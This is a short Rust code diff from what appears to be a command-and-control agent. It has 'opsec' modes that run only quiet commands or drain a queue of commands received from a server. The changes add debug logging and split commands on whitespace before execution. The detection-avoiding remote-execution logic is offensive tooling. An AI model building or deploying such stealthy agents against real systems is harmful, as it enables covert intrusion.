@@ -209,6 +209,7 @@ async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agen
 // Check if the command should be executed based on the current opsec mode
 async fn should_execute_command(cmd: &str) -> bool {
     let mode = OPSEC_STATE.lock().unwrap().mode;
+    debug!("[OPSEC] should_execute_command: mode={:?}, cmd={}", mode, cmd);
     match mode {
         AgentMode::FullOpsec => {
             // Only allow ultra-quiet commands, skip noisy ones
@@ -334,21 +335,20 @@ pub async fn handle_command(command: &str) {
                 return;
             }
             // Execute quiet command immediately
-            execute_command(command).await;
+            let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+            execute_command(&cmd_parts).await;
         }
         AgentMode::BackgroundOpsec => {
             // Execute immediately
-            execute_command(command).await;
+            let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+            execute_command(&cmd_parts).await;
             // Drain and execute queued commands
             let mut queue = QUEUED_COMMANDS.lock().unwrap();
             for cmd in queue.drain(..) {
                 debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
-                execute_command(&cmd).await;
+                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
+                execute_command(&cmd_parts).await;
             }
         }
     }
-}
-
-async fn execute_command(command: &str) {
-    // Your actual command execution logic here
 }
